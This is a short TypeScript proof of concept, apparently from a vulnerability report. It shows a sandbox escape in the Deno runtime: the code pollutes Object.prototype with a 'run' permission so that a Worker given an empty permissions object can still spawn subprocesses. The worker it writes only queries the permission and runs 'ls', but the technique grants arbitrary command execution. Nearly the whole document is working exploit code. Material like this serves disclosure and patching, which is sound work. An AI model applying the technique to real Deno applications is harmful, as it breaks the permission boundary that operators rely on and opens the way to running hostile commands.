// Create worker on the fly
Deno.writeTextFileSync(
  "./worker.ts",
  "console.log(await Deno.permissions.query({ name: 'run' }));" +
  "(new Deno.Command('ls')).spawn();" +
  "Deno.exit(1);",
  { create: true },
);


// PoC
function pollute(key: string, value: any) {
  ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("run", true);
new Worker(
  import.meta.resolve("./worker.ts"),
  { type: "module", deno: { permissions: {/*some object*/} } },
);
